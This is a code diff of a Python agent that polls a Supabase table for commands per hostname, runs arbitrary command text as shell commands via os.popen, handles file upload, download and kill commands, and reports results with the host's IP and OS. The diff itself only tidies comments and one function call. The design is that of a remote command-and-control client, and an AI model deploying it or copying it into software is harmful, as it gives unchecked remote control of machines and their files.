@@ -1,6 +1,6 @@
 import os
 import logging
-from supabase import Client   # Import the Client class
+from supabase import Client  # Import the Client class
 from .commands import update_command_status, fetch_pending_commands_for_hostname
 from .file_operations import handle_download_command, handle_upload_command, fetch_pending_uploads, download_from_supabase
 from .system_info import get_system_info
@@ -44,7 +44,7 @@ def handle_kill_command(command_id, command_text, hostname, supabase: Client):
             logging.info("Shutdown sequence initiated.")
             os._exit(0)  # Force the agent to terminate
 
-def execute_commands(supabase: Client):  # Pass supabase client
+def execute_commands(supabase: Client):
     """Executes pending commands and handles file uploads/downloads."""
 
     hostname, ip, os_info = get_system_info()
@@ -62,20 +62,20 @@ def execute_commands(supabase: Client):  # Pass supabase client
                     supabase.table("uploads").update({"status": "failed"}).eq("id", upload['id']).execute()
 
     # Handle other commands
-    pending_commands_response = fetch_pending_commands_for_hostname(hostname, supabase)  # Pass supabase client
-    if pending_commands_response.data:  # Check for commands
+    pending_commands_response = fetch_pending_commands_for_hostname(hostname, supabase)
+    if pending_commands_response.data:
         for command in pending_commands_response.data:
             command_id = command['id']
             command_text = command['command']
             username = command.get('username', 'Unknown')
 
             # Handle kill command (this will exit the script if applicable)
-            handle_kill_command(command_id, command_text, hostname, supabase)  # Pass supabase client
+            handle_kill_command(command_id, command_text, hostname, supabase)
 
             if command_text.lower().startswith('download'):
-                status, output = handle_download_command(command_text, username, supabase)  # Pass supabase client
+                status, output = handle_download_command(command_text, username, supabase)
             elif command_text.lower().startswith('upload'):
-                status, output = handle_upload_command(command_text, command.get('output', ''), username, supabase)  # Pass supabase client
+                status, output = handle_upload_command(command_text, username, supabase)
             else:
                 try:
                     result = os.popen(command_text).read()
@@ -84,4 +84,4 @@ def execute_commands(supabase: Client):  # Pass supabase client
                 except Exception as e:
                     status = 'Failed'
                     output = str(e)
-            update_command_status(supabase, command_id, status, output, hostname, ip, os_info, username)  # Pass supabase
+            update_command_status(supabase, command_id, status, output, hostname, ip, os_info, username)
